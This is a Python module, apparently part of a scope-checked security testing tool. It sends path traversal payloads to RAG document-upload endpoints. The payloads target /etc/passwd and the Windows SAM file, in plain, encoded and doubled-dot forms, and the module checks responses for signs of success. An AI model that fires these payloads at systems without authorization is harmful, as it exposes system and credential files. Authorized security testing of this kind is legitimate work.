"""
Upload path traversal tester for document loaders.

Tests for path traversal in RAG document upload/loading:
- ../../../etc/passwd patterns
- Absolute path injection
- Symbolic link exploitation
- Archive extraction vulnerabilities (zip slip)

Common in:
- LangChain document loaders
- LlamaIndex file readers
- Custom RAG implementations
"""

import logging
from typing import List, Dict, Any, Optional

from ..core.scope_validator import ScopeValidator
from ..core.grpc_clients import ProbeClient

logger = logging.getLogger(__name__)


class UploadPathTraversalTester:
    """Upload path traversal tester."""

    def __init__(
        self,
        scope_validator: ScopeValidator,
        probe_client: ProbeClient,
    ):
        self.scope_validator = scope_validator
        self.probe_client = probe_client
        logger.info("Upload path traversal tester initialized")

    def run(
        self,
        target_url: str,
        campaign_id: str,
        method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        """Runs path traversal tests."""
        self.scope_validator.validate_or_raise(target_url)
        
        payloads = self._generate_path_traversal_payloads()
        logger.info(f"Running path traversal tests: {len(payloads)} payloads")
        
        results = self.probe_client.fire_batch(
            payloads=payloads,
            endpoint_url=target_url,
            method=method,
            headers=headers or {},
            body_schema='{"file_path":"$PAYLOAD"}',
            template_id="",
            campaign_id=campaign_id,
        )
        
        findings = []
        for result in results:
            # Check for path traversal success indicators
            if self._is_path_traversal_success(result.response_body):
                findings.append({
                    "finding_family": "path_traversal",
                    "finding_type": "upload_path_traversal",
                    "payload": result.payload,
                    "response": result.response_body,
                    "severity": "high",
                })
        
        return findings

    def _generate_path_traversal_payloads(self) -> List[str]:
        """Generates path traversal payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]

    def _is_path_traversal_success(self, response: str) -> bool:
        """Checks if response indicates successful path traversal."""
        indicators = [
            "root:x:",  # /etc/passwd
            "[boot loader]",  # Windows SAM
            "daemon:",
            "bin:",
        ]
        for indicator in indicators:
            if indicator in response:
                return True
        return False


logger.info("Upload path traversal tester module loaded")
